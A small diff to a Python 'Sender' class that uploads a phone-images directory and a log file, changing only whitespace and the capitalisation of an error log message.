@@ -33,8 +33,8 @@ class Sender:
             await self.Send_Directory_Containing(f"Phones/Images/{Now}")            # Sending all documents in the directory
 
             await self.send_document(f'Log/Main_Logs/{Now}.log')
-            
+
         except:
-            logger.critical('Files Didnt sent')
+            logger.critical('Files didnt sent')
         else:
             logger.info("all files have been sent successfully")
